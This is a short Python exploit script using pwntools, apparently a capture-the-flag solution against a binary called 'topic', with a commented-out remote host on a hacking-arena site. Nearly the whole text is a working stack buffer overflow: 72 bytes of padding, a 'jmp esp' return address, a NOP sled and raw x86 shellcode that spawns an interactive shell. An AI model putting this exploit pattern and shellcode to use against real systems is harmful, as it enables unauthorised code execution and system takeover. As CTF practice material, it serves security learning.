from pwn import *

# Choose io input from the 
io = process("./topic")
#io = remote("jabba.hackingarena.com", 825)

raw_input("Time to attach GDB") # Only if using 
# Getting past the first prompt and read until i get the prompt then sendline
io.recvregex(b"Quit")
io.sendline(b"1")

# Read until i get answer
io.recvregex(b"\?") #recieve lines until i get a questionmark

# Create payload.
payload = b"\x31" * 72 # found in "topic padding length" targetting EIP register (next command to be executed) 
payload += p32(0x0804936c) # Address of an "jmp esp" instruction 
payload += b"\x90" * 100 # nop sled to slide into the shellcode area.
payload += b'\x99\x52\x58\x52\xbf\xb7\x97\x39\x34\x01\xff\x57\xbf\x97\x17\xb1\x34\x01\xff\x47\x57\x89\xe3\x52\x53\x89\xe1\xb0\x63\x2c\x58\x81\xef\x62\xae\x61\x69\x57\xff\xd4'   


log.info("Delivering payload")
io.sendline(payload)
print(io.recv())
io.interactive() # interactive because i am getting shell.
